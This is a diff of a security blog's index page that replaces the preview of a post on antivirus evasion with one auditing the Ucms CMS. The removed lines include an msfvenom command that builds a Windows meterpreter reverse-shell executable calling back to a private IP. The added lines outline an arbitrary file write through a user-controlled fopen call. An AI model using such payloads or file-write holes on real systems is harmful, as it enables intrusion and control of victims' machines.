@@ -994,7 +994,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/">
+    <link itemprop="mainEntityOfPage" href="http://bai-ren-1.github.io/2020/08/26/Ucms/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="白仁">
@@ -1013,7 +1013,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/" itemprop="url">免杀入门</a></h1>
+                <a class="post-title-link" href="/2020/08/26/Ucms/" itemprop="url">Ucms</a></h1>
         
 
         <div class="post-meta">
@@ -1025,8 +1025,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-09-05T13:21:16+08:00">
-                2020-09-05
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-08-26T11:01:19+08:00">
+                2020-08-26
               </time>
             
 
@@ -1048,8 +1048,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%90%8E%E6%B8%97%E9%80%8F/" itemprop="url" rel="index">
-                    <span itemprop="name">后渗透</span>
+                  <a href="/categories/WEB%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">WEB安全</span>
                   </a>
                 </span>
 
@@ -1087,15 +1087,19 @@
       
         
           
-          免杀入门学习一下入门级别的免杀，记录一下。这里没啥环境测试环境就只使用火绒。
-0x00 无免杀
-1msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.2.108 LPORT=3333 -f exe -o origin.exe
+          Ucms写着玩。
 
-不做免杀
+全局搜索fopen：
+
+跟进最后一项，发现可以操作：
+
+里面就是根据$alldir和$filename变量打开文件并且往其中写入$content（$content的内容是我们POST直接可控的）。然后我们看上面需要什么限定：
+
+发现$alldir和$filename变量都是我们G
           ...
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/2020/09/05/%E5%85%8D%E6%9D%80%E5%85%A5%E9%97%A8/#more" rel="contents">
+            <a class="btn" href="/2020/08/26/Ucms/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1784,7 +1788,7 @@ https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">50</span>
+                  <span class="site-state-item-count">49</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1795,7 +1799,7 @@ https://misakikata.github.io/2020/04/Spring-%E6%A1%86%E6%9E%B6%E6%BC%8F%E6%B4%9E
               
               <div class="site-state-item site-state-categories">
                 <a href="/categories/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">5</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
